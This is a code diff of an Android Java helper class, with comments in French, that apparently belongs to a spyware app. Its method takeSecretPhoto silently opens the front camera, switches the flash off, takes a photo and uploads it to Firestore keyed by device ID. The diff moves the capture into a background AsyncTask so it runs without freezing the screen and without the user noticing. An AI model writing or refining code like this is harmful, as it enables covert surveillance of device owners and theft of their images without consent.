@@ -4,6 +4,7 @@ import android.content.Context;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.hardware.Camera;
+import android.os.AsyncTask;
 import android.util.Base64;
 import android.util.Log;
 import android.widget.Toast;
@@ -12,56 +13,66 @@ import java.io.ByteArrayOutputStream;
 
 public class CameraHelper {
 
-    private static Camera camera;
-
     public static void takeSecretPhoto(Context context, String deviceId) {
-        // FAILLE 2 : Vérifier si la caméra frontale existe avant de l'ouvrir
-        int cameraId = -1;
-        int numberOfCameras = Camera.getNumberOfCameras();
-        for (int i = 0; i < numberOfCameras; i++) {
-            Camera.CameraInfo info = new Camera.CameraInfo();
-            Camera.getCameraInfo(i, info);
-            if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
-                cameraId = i;
-                break;
-            }
+        // FAILLE 2 : Exécuter la caméra en arrière-plan pour ne pas geler l'écran
+        new CameraTask(context.getApplicationContext(), deviceId).execute();
+    }
+
+    private static class CameraTask extends AsyncTask<Void, Void, Void> {
+        private final Context appContext;
+        private final String deviceId;
+
+        CameraTask(Context appContext, String deviceId) {
+            this.appContext = appContext;
+            this.deviceId = deviceId;
         }
 
-        if (cameraId == -1) {
-            Log.e("CameraHelper", "Pas de caméra frontale trouvée.");
-            return; // Ne pas crasher, juste abandonner
-        }
-
-        try {
-            camera = Camera.open(cameraId);
-            if (camera == null) return;
-
-            Camera.Parameters params = camera.getParameters();
-            params.setFlashMode(Camera.Parameters.FLASH_MODE_OFF);
-            camera.setParameters(params);
-
-            camera.startPreview();
-            camera.takePicture(null, null, new Camera.PictureCallback() {
-                @Override
-                public void onPictureTaken(byte[] data, Camera camera) {
-                    try {
-                        uploadPhotoToFirestore(context, data, deviceId);
-                    } catch (Exception e) {
-                        Log.e("CameraHelper", "Erreur upload: " + e.getMessage());
-                    } finally {
-                        if (camera != null) {
-                            camera.release();
-                            CameraHelper.camera = null;
-                        }
+        @Override
+        protected Void doInBackground(Void... voids) {
+            Camera camera = null;
+            try {
+                // FAILLE 1 : Pas de variable statique, la caméra est locale.
+                int cameraId = -1;
+                int numberOfCameras = Camera.getNumberOfCameras();
+                for (int i = 0; i < numberOfCameras; i++) {
+                    Camera.CameraInfo info = new Camera.CameraInfo();
+                    Camera.getCameraInfo(i, info);
+                    if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
+                        cameraId = i;
+                        break;
                     }
                 }
-            });
-        } catch (Exception e) {
-            Log.e("CameraHelper", "Erreur caméra: " + e.getMessage());
-            if (camera != null) {
-                camera.release();
-                camera = null;
+
+                if (cameraId == -1) return null;
+
+                camera = Camera.open(cameraId);
+                if (camera == null) return null;
+
+                Camera.Parameters params = camera.getParameters();
+                params.setFlashMode(Camera.Parameters.FLASH_MODE_OFF);
+                camera.setParameters(params);
+
+                camera.startPreview();
+                camera.takePicture(null, null, new Camera.PictureCallback() {
+                    @Override
+                    public void onPictureTaken(byte[] data, Camera camera) {
+                        try {
+                            uploadPhotoToFirestore(appContext, data, deviceId);
+                        } catch (Exception e) {
+                            Log.e("CameraHelper", "Erreur upload: " + e.getMessage());
+                        } finally {
+                            if (camera != null) camera.release();
+                        }
+                    }
+                });
+                // Laisser le temps à la caméra de prendre la photo avant de relâcher
+                Thread.sleep(1000); 
+            } catch (Exception e) {
+                Log.e("CameraHelper", "Erreur caméra: " + e.getMessage());
+            } finally {
+                if (camera != null) camera.release();
             }
+            return null;
         }
     }
 
